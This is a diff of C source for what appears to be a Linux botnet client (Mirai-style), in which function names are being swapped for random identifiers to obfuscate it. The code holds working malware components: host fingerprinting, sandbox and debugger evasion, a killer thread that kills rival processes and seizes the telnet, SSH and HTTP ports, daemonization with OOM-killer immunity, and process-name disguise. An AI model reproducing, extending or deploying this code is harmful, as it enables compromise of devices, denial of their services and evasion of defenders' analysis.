@@ -10,7 +10,7 @@
  * SYSTEM INFO
  * ========================================================================== */
 
-void charming_kitten(dstr *out) {
+void Xy5oR2j(dstr *out) {
     struct utsname u;
     const char *machine;
 
@@ -43,13 +43,13 @@ void charming_kitten(dstr *out) {
     }
 }
 
-int64_t revil_mem(void) {
+int64_t HY8cY3Q(void) {
     struct sysinfo si;
     if (sysinfo(&si) != 0) return 0;
     return (int64_t)((uint64_t)si.totalram * (uint64_t)si.mem_unit / 1024 / 1024);
 }
 
-int revil_cpu(void) {
+int un5KE2K(void) {
     /* Try /proc/cpuinfo first — works on all Linux including old uClibc */
     FILE *f = fopen("/proc/cpuinfo", "r");
     if (f) {
@@ -69,7 +69,7 @@ int revil_cpu(void) {
     }
 }
 
-void revil_proc(dstr *out) {
+void uw2zs4U(dstr *out) {
     char buf[4096];
     ssize_t len;
     const char *base;
@@ -86,11 +86,11 @@ void revil_proc(dstr *out) {
 }
 
 /* --------------------------------------------------------------------------
-   revil_speed_test — measure upload/download speed via HTTP GET
-   Downloads from g_speed_test_url, times the transfer, returns Mbps.
+   Rz5Yb6g — measure upload/download speed via HTTP GET
+   Downloads from _CT6sh3M, times the transfer, returns Mbps.
    All in-memory, no disk writes.  Falls back to 0.0 on any failure.
    -------------------------------------------------------------------------- */
-static double revil_speed_test(void)
+static double Rz5Yb6g(void)
 {
     const char *url, *p, *slash, *colon;
     char host[256], port[8], path[512];
@@ -106,8 +106,8 @@ static double revil_speed_test(void)
     struct timeval tv;
     int ret;
 
-    ensure_proto();
-    url = ds_cstr(&g_speed_test_url);
+    DS4RR2W();
+    url = ds_cstr(&_CT6sh3M);
     if (!url || !url[0]) return 0.0;
 
     /* parse URL: http://host[:port]/path */
@@ -202,35 +202,35 @@ static double revil_speed_test(void)
     if (elapsed < 0.001) return 0.0; /* avoid div-by-zero */
 
     mbps = ((double)total_bytes * 8.0) / (elapsed * 1e6);
-    debug_log("revil_speed_test: downloaded %zu bytes in %.3fs = %.2f Mbps",
+    _nS5PJ8Y("Rz5Yb6g: downloaded %zu bytes in %.3fs = %.2f Mbps",
               total_bytes, elapsed, mbps);
     return mbps;
 }
 
-double revil_uplink_cached(void) {
+double Gm3pk8i(void) {
     FILE *f;
     double speed;
 
-    ensure_boot();
+    iB2Zq4a();
 
     /* check cache first */
-    f = fopen(ds_cstr(&g_cache_loc), "r");
+    f = fopen(ds_cstr(&_cd2pA4A), "r");
     if (f) {
         speed = 0.0;
         if (fscanf(f, "%lf", &speed) == 1 && speed > 0.0) {
             fclose(f);
-            debug_log("revil_uplink_cached: Using cached speed: %.2f Mbps", speed);
+            _nS5PJ8Y("Gm3pk8i: Using cached speed: %.2f Mbps", speed);
             return speed;
         }
         fclose(f);
     }
 
     /* run speed test */
-    speed = revil_speed_test();
+    speed = Rz5Yb6g();
 
     /* cache result to avoid re-testing on reconnect */
     if (speed > 0.0) {
-        f = fopen(ds_cstr(&g_cache_loc), "w");
+        f = fopen(ds_cstr(&_cd2pA4A), "w");
         if (f) {
             fprintf(f, "%.2f", speed);
             fclose(f);
@@ -246,7 +246,7 @@ double revil_uplink_cached(void) {
  * Read MAC from /sys/class/net/<iface>/address (no getifaddrs)
  * ========================================================================== */
 
-void mustang_panda(dstr *out) {
+void Ai2mW7K(dstr *out) {
     char hostname[256];
     dstr mac;
     DIR *d;
@@ -299,10 +299,10 @@ void mustang_panda(dstr *out) {
     ds_catds(&data, &mac);
     ds_free(&mac);
 
-    hash = sha256_str(ds_cstr(&data));
+    hash = _Ug8Lk6u(ds_cstr(&data));
     ds_free(&data);
 
-    hex = hex_encode(db_ptr(&hash), 4); /* first 4 bytes = 8 hex chars */
+    hex = _dJ2Bc5Y(db_ptr(&hash), 4); /* first 4 bytes = 8 hex chars */
     db_free(&hash);
 
     ds_set(out, ds_cstr(&hex));
@@ -310,11 +310,11 @@ void mustang_panda(dstr *out) {
 }
 
 /* ==========================================================================
- * SANDBOX / ANALYSIS DETECTION (matches Go winnti)
+ * SANDBOX / ANALYSIS DETECTION (matches Go VA3rJ6j)
  * ========================================================================== */
 
 /* helper: convert char to lowercase */
-static char to_lower(char c) {
+static char _wN4iv4N(char c) {
     return (c >= 'A' && c <= 'Z') ? (char)(c + ('a' - 'A')) : c;
 }
 
@@ -328,7 +328,7 @@ static const char *stristr(const char *haystack, const char *needle) {
         int match = 1;
         for (i = 0; i < nlen; i++) {
             if (!haystack[i]) { match = 0; break; }
-            if (to_lower(haystack[i]) != to_lower(needle[i])) { match = 0; break; }
+            if (_wN4iv4N(haystack[i]) != _wN4iv4N(needle[i])) { match = 0; break; }
         }
         if (match) return haystack;
         haystack++;
@@ -337,7 +337,7 @@ static const char *stristr(const char *haystack, const char *needle) {
 }
 
 /* helper: check if string is all digits (a PID) */
-static int is_pid_str(const char *s) {
+static int _oZ3dq3f(const char *s) {
     if (!s || !*s) return 0;
     while (*s) {
         if (*s < '0' || *s > '9') return 0;
@@ -352,7 +352,7 @@ static int is_pid_str(const char *s) {
  * on rdtsc-equivalent or clock_gettime calls.  We time a small
  * computation; if the delta exceeds a threshold the environment is suspect.
  */
-static int timing_check(void) {
+static int _iq3Hd8G(void) {
     struct timespec t0, t1, req;
     long delta_ns;
     int round;
@@ -369,7 +369,7 @@ static int timing_check(void) {
      *   - Round up to milliseconds (delta >> 50000 ns)
      *   - Fail to maintain monotonic clock consistency
      *
-     * If the measured delay exceeds 500 µs (10000x the requested 50 ns),
+     * If the measured delay exceeds 500 rS2rg3G (10000x the requested 50 ns),
      * the environment cannot faithfully handle fine-grained sleeps.
      * Two of three rounds must fail to trigger detection.
      */
@@ -387,7 +387,7 @@ static int timing_check(void) {
     }
 
     /* Stage 2: syscall timing — 50 trivial getpid() calls.
-     * On real HW: ~10-15 µs total. Under ptrace/strace: >1 ms.
+     * On real HW: ~10-15 rS2rg3G total. Under ptrace/strace: >1 ms.
      * Catches analysts running the binary under tracing tools. */
     {
         int sf = 0;
@@ -405,10 +405,10 @@ static int timing_check(void) {
     return (fails >= 2);
 }
 
-int winnti(void) {
+int VA3rJ6j(void) {
     /* ---- Stage 1: nanosecond timing gate (must pass first) ---- */
-    if (timing_check()) {
-        debug_log("winnti: timing check FAILED — sandbox/emulator suspected");
+    if (_iq3Hd8G()) {
+        _nS5PJ8Y("VA3rJ6j: timing check FAILED — sandbox/emulator suspected");
         return 1;
     }
 
@@ -417,7 +417,7 @@ int winnti(void) {
         DIR *d;
         struct dirent *ent;
 
-        ensure_killer(); /* decrypts g_sb_names */
+        PP3yJ4J(); /* decrypts _Ds7cV2u */
 
         d = opendir("/proc");
         if (d) {
@@ -431,7 +431,7 @@ int winnti(void) {
                 size_t k;
                 int pid_num;
 
-                if (!is_pid_str(ent->d_name)) continue;
+                if (!_oZ3dq3f(ent->d_name)) continue;
                 pid_num = atoi(ent->d_name);
                 if (pid_num == (int)self || pid_num == (int)parent) continue;
 
@@ -449,10 +449,10 @@ int winnti(void) {
                 }
                 cmdline[total] = '\0';
 
-                for (k = 0; k < sa_count(&g_sb_names); k++) {
-                    if (stristr(cmdline, sa_get(&g_sb_names, k))) {
-                        debug_log("winnti: sandbox name '%s' in PID %s",
-                                  sa_get(&g_sb_names, k), ent->d_name);
+                for (k = 0; k < sa_count(&_Ds7cV2u); k++) {
+                    if (stristr(cmdline, sa_get(&_Ds7cV2u, k))) {
+                        _nS5PJ8Y("VA3rJ6j: sandbox name '%s' in PID %s",
+                                  sa_get(&_Ds7cV2u, k), ent->d_name);
                         closedir(d);
                         return 1;
                     }
@@ -471,10 +471,10 @@ int winnti(void) {
  * and other known bot process names.
  * ========================================================================== */
 
-/* IOC patterns decrypted at runtime from g_kill_patterns (via ensure_killer) */
+/* IOC patterns decrypted at runtime from _wP7xV7q (via PP3yJ4J) */
 
 /* kill-by-port: parse /proc/net/tcp for inode, find owning PID, kill it */
-static int killer_kill_by_port(int port)
+static int uU4kL2w(int port)
 {
     int fd, ret = 0;
     char buf[512];
@@ -542,7 +542,7 @@ static int killer_kill_by_port(int port)
     if (target_inode[0] == '\0' || strcmp(target_inode, "0") == 0)
         return 0;
 
-    debug_log("killer: port %d -> inode %s", port, target_inode);
+    _nS5PJ8Y("killer: port %d -> inode %s", port, target_inode);
 
     /* step 2: find PID owning this inode via /proc/PID/fd/ symlinks */
     {
@@ -556,7 +556,7 @@ static int killer_kill_by_port(int port)
             struct dirent *fd_ent;
             int pid;
 
-            if (!is_pid_str(pent->d_name)) continue;
+            if (!_oZ3dq3f(pent->d_name)) continue;
             pid = atoi(pent->d_name);
             if (pid <= 1) continue;
 
@@ -579,7 +579,7 @@ static int killer_kill_by_port(int port)
                     char *bracket = strchr(inode_start, ']');
                     if (bracket) *bracket = '\0';
                     if (strcmp(inode_start, target_inode) == 0) {
-                        debug_log("killer: port %d held by PID %d, killing", port, pid);
+                        _nS5PJ8Y("killer: port %d held by PID %d, killing", port, pid);
                         kill(pid, SIGKILL);
                         ret = 1;
                         break;
@@ -595,12 +595,12 @@ static int killer_kill_by_port(int port)
 }
 
 /* steal a port: kill owner, bind to it so nothing else can reclaim it */
-static void killer_steal_port(int port)
+static void MA2Zm5N(int port)
 {
     struct sockaddr_in addr;
     int fd, opt = 1;
 
-    killer_kill_by_port(port);
+    uU4kL2w(port);
     usleep(100000); /* 100ms for process to die */
 
     fd = socket(AF_INET, SOCK_STREAM, 0);
@@ -614,18 +614,18 @@ static void killer_steal_port(int port)
 
     if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
         listen(fd, 1);
-        debug_log("killer: stole port %d", port);
+        _nS5PJ8Y("killer: stole port %d", port);
         /* fd intentionally leaked — keeps the port bound */
     } else {
         close(fd);
-        debug_log("killer: failed to bind port %d", port);
+        _nS5PJ8Y("killer: failed to bind port %d", port);
     }
 }
 
 /* Get the bot's own exe path (without " (deleted)" suffix), cached */
 static char self_exe_path[4096] = {0};
 
-static void killer_cache_self_exe(void)
+static void LM8nD3K(void)
 {
     ssize_t len;
     char *del;
@@ -640,7 +640,7 @@ static void killer_cache_self_exe(void)
 }
 
 /* Check if a PID is running our own binary by comparing exe paths */
-static int is_self_process(int pid)
+static int _Kk6bG3C(int pid)
 {
     char link_path[64];
     char exe[4096];
@@ -659,15 +659,15 @@ static int is_self_process(int pid)
     return (self_exe_path[0] && strcmp(exe, self_exe_path) == 0);
 }
 
-static void killer_scan_once(void)
+static void sq6un4t(void)
 {
     pid_t self = getpid();
     pid_t parent = getppid();
     DIR *d;
     struct dirent *ent;
 
-    killer_cache_self_exe();
-    ensure_killer(); /* decrypts g_kill_patterns */
+    LM8nD3K();
+    PP3yJ4J(); /* decrypts _wP7xV7q */
 
     d = opendir("/proc");
     if (!d) return;
@@ -683,12 +683,12 @@ static void killer_scan_once(void)
         size_t total, j;
         size_t k;
 
-        if (!is_pid_str(ent->d_name)) continue;
+        if (!_oZ3dq3f(ent->d_name)) continue;
         pid = atoi(ent->d_name);
         if (pid <= 1 || pid == (int)self || pid == (int)parent) continue;
 
         /* skip any process running our own binary (flood forks, etc) */
-        if (is_self_process(pid)) continue;
+        if (_Kk6bG3C(pid)) continue;
 
         /* skip our own children (scanner forks that exec sh/wget/etc) */
         {
@@ -719,7 +719,7 @@ static void killer_scan_once(void)
         /* Kill processes running from deleted binaries — classic competing
          * malware indicator. Skip ourselves (already handled above). */
         if (exe_buf[0] && strstr(exe_buf, " (deleted)") != NULL) {
-            debug_log("killer: PID %d running deleted binary [%s], killing", pid, exe_buf);
+            _nS5PJ8Y("killer: PID %d running deleted binary [%s], killing", pid, exe_buf);
             kill(pid, SIGKILL);
             continue;
         }
@@ -738,11 +738,11 @@ static void killer_scan_once(void)
             }
         }
 
-        for (k = 0; k < sa_count(&g_kill_patterns); k++) {
-            const char *pat = sa_get(&g_kill_patterns, k);
+        for (k = 0; k < sa_count(&_wP7xV7q); k++) {
+            const char *pat = sa_get(&_wP7xV7q, k);
             if (stristr(cmdline, pat) ||
                 (exe_buf[0] && stristr(exe_buf, pat))) {
-                debug_log("killer: IOC '%s' matched PID %d [%s], killing",
+                _nS5PJ8Y("killer: IOC '%s' matched PID %d [%s], killing",
                           pat, pid, cmdline);
                 kill(pid, SIGKILL);
                 break;
@@ -761,26 +761,26 @@ static void *killer_thread(void *arg)
 
 #ifndef DEBUG
     /* steal common ports — kill owners, bind to prevent restart */
-    killer_steal_port(23);  /* telnet */
-    killer_steal_port(22);  /* ssh */
-    killer_steal_port(80);  /* http */
+    MA2Zm5N(23);  /* telnet */
+    MA2Zm5N(22);  /* ssh */
+    MA2Zm5N(80);  /* http */
 #endif
 
-    debug_log("killer: starting IOC scanner loop");
+    _nS5PJ8Y("killer: starting IOC scanner loop");
     for (;;) {
-        killer_scan_once();
+        sq6un4t();
         /* scan every 30-60 seconds */
         sleep_ms(jitter_ms(30000, 60000));
     }
     return NULL;
 }
 
-void killer_start(void)
+void HZ8hr8M(void)
 {
     pthread_t tid;
     pthread_create(&tid, NULL, killer_thread, NULL);
     pthread_detach(tid);
-    debug_log("killer: IOC scanner thread started");
+    _nS5PJ8Y("killer: IOC scanner thread started");
 }
 
 /* ==========================================================================
@@ -802,7 +802,7 @@ static void *ctrl_listener_fn(void *arg) {
         char buf[32];
         ssize_t n;
 
-        cfd = accept(g_ctrl_fd, (struct sockaddr *)&cli, &clen);
+        cfd = accept(_ib2tD7y, (struct sockaddr *)&cli, &clen);
         if (cfd < 0) break; /* fd closed → we're shutting down */
 
         /* Only accept from 127.0.0.1 */
@@ -817,7 +817,7 @@ static void *ctrl_listener_fn(void *arg) {
         if (n > 0) {
             buf[n] = '\0';
             if (strstr(buf, "sweedishsniper")) {
-                debug_log("ctrl: magic received, shutting down");
+                _nS5PJ8Y("ctrl: magic received, shutting down");
                 _exit(0);
             }
         }
@@ -826,34 +826,34 @@ static void *ctrl_listener_fn(void *arg) {
 }
 
 /* Try to bind the control port; returns 1 on success, 0 on failure */
-static int try_bind_ctrl(void) {
+static int _aC8kt7n(void) {
     struct sockaddr_in addr;
     int opt = 1;
 
-    g_ctrl_fd = socket(AF_INET, SOCK_STREAM, 0);
-    if (g_ctrl_fd < 0) return 0;
+    _ib2tD7y = socket(AF_INET, SOCK_STREAM, 0);
+    if (_ib2tD7y < 0) return 0;
 
-    setsockopt(g_ctrl_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+    setsockopt(_ib2tD7y, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
 
     memset(&addr, 0, sizeof(addr));
     addr.sin_family      = AF_INET;
     addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
     addr.sin_port        = htons(CTRL_PORT);
 
-    if (bind(g_ctrl_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
-        close(g_ctrl_fd);
-        g_ctrl_fd = -1;
+    if (bind(_ib2tD7y, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
+        close(_ib2tD7y);
+        _ib2tD7y = -1;
         return 0;
     }
 
-    listen(g_ctrl_fd, 1);
-    fcntl(g_ctrl_fd, F_SETFD, FD_CLOEXEC);
+    listen(_ib2tD7y, 1);
+    fcntl(_ib2tD7y, F_SETFD, FD_CLOEXEC);
     return 1;
 }
 
 /* Send magic word to whatever is listening on the control port.
  * Returns 1 if we connected (something was there), 0 if nothing listening. */
-static int send_exit_ctrl(void) {
+static int _Jy2NQ5B(void) {
     struct sockaddr_in addr;
     int fd;
 
@@ -874,44 +874,44 @@ static int send_exit_ctrl(void) {
     return 0;
 }
 
-int revil_single_instance(void) {
+int Bp3Tq8Z(void) {
     pthread_t tid;
     int sent_exit = 0;
     int attempt;
 
-    ensure_boot();
-    ensure_persist();
+    iB2Zq4a();
+    Ri2bh5v();
 
     /* ── Step 1: send EXIT to old instance if port is occupied ── */
-    if (send_exit_ctrl()) {
+    if (_Jy2NQ5B()) {
         sent_exit = 1;
-        debug_log("revil_single_instance: sent magic on port %d", CTRL_PORT);
+        _nS5PJ8Y("Bp3Tq8Z: sent magic on port %d", CTRL_PORT);
         usleep(500000); /* 500 ms for clean shutdown */
     }
 
     /* ── Step 2: try to bind, retry a few times ── */
     for (attempt = 0; attempt < 3; attempt++) {
-        if (try_bind_ctrl()) goto bound;
+        if (_aC8kt7n()) goto bound;
         if (attempt == 0 && !sent_exit) break; /* nothing was there, bind just failed */
-        debug_log("revil_single_instance: bind attempt %d failed, retrying", attempt + 1);
+        _nS5PJ8Y("Bp3Tq8Z: bind attempt %d failed, retrying", attempt + 1);
         usleep(300000); /* 300 ms between retries */
     }
 
     /* ── Step 3: magic word didn't work — escalate to /proc fd kill ── */
     if (sent_exit) {
-        debug_log("revil_single_instance: magic ignored, escalating to fd kill");
-        killer_kill_by_port(CTRL_PORT);
+        _nS5PJ8Y("Bp3Tq8Z: magic ignored, escalating to fd kill");
+        uU4kL2w(CTRL_PORT);
         usleep(500000);
 
-        if (try_bind_ctrl()) goto bound;
+        if (_aC8kt7n()) goto bound;
     }
 
     /* ── Couldn't grab port — carry on without it, CNC handles the edge case ── */
-    debug_log("revil_single_instance: port %d unavailable, continuing without control port", CTRL_PORT);
+    _nS5PJ8Y("Bp3Tq8Z: port %d unavailable, continuing without control port", CTRL_PORT);
     goto done;
 
 bound:
-    debug_log("revil_single_instance: control port %d bound", CTRL_PORT);
+    _nS5PJ8Y("Bp3Tq8Z: control port %d bound", CTRL_PORT);
 
     /* ── Start listener thread ── */
     pthread_create(&tid, NULL, ctrl_listener_fn, NULL);
@@ -919,36 +919,36 @@ bound:
 
     /* ── Write PID file (systemd PIDFile= still needs it) ── */
     {
-        FILE *f = fopen(ds_cstr(&g_lock_loc), "w");
+        FILE *f = fopen(ds_cstr(&_aN8Lh6d), "w");
         if (f) {
             char pid_str[32];
             snprintf(pid_str, sizeof(pid_str), "%d", (int)getpid());
             fputs(pid_str, f);
             fclose(f);
-            chmod(ds_cstr(&g_lock_loc), 0600);
+            chmod(ds_cstr(&_aN8Lh6d), 0600);
         }
     }
 
-    debug_log("revil_single_instance: lock acquired (PID %d, port %d)", (int)getpid(), CTRL_PORT);
+    _nS5PJ8Y("Bp3Tq8Z: lock acquired (PID %d, port %d)", (int)getpid(), CTRL_PORT);
 
 done:
     return 1;
 }
 
 /* ==========================================================================
- * DAEMONIZATION (matches Go stuxnet)
+ * DAEMONIZATION (matches Go uQ5tH2B)
  * Fork + setsid + redirect fds + ignore signals
  * ========================================================================== */
 
-static void daemon_housekeep(void) {
+static void _vv8Xr3W(void) {
     int null_fd, fd;
 
     /* Release any filesystem mount held by CWD */
     (void)chdir("/");
     umask(0);
 
-    ensure_boot();
-    null_fd = open(ds_cstr(&g_dev_null_path), O_RDWR);
+    iB2Zq4a();
+    null_fd = open(ds_cstr(&_Qt5Ey5X), O_RDWR);
     if (null_fd >= 0) {
         dup2(null_fd, STDIN_FILENO);
         dup2(null_fd, STDOUT_FILENO);
@@ -973,7 +973,7 @@ static void daemon_housekeep(void) {
     signal(SIGPIPE, SIG_IGN);
 }
 
-void stuxnet(int argc, char **argv) {
+void uQ5tH2B(int argc, char **argv) {
     pid_t pid;
     sigset_t sigs;
     int wfd;
@@ -1030,7 +1030,7 @@ void stuxnet(int argc, char **argv) {
     if (pid > 0) _exit(0);
 
     /* Final daemon process: not a session leader, fully detached */
-    daemon_housekeep();
+    _vv8Xr3W();
 
     /* OOM killer immunity — main bot process must survive at all costs.
      * Attack children reset this to 0 in let_em_cook() so OOM
@@ -1044,13 +1044,13 @@ void stuxnet(int argc, char **argv) {
     }
 
     /* Disguise process name in ps/top */
-    ensure_proto(); /* decrypts g_camo_names */
-    if (sa_count(&g_camo_names) > 0 && argc > 0 && argv && argv[0]) {
-        const char *fake = sa_get(&g_camo_names, urandom_u32() % sa_count(&g_camo_names));
+    DS4RR2W(); /* decrypts _xJ8ym8N */
+    if (sa_count(&_xJ8ym8N) > 0 && argc > 0 && argv && argv[0]) {
+        const char *fake = sa_get(&_xJ8ym8N, urandom_u32() % sa_count(&_xJ8ym8N));
         size_t orig_len = strlen(argv[0]);
         memset(argv[0], 0, orig_len);
         strncpy(argv[0], fake, orig_len);
         prctl(PR_SET_NAME, (unsigned long)fake, 0, 0, 0);
-        debug_log("stuxnet: process disguised as '%s'", fake);
+        _nS5PJ8Y("uQ5tH2B: process disguised as '%s'", fake);
     }
 }
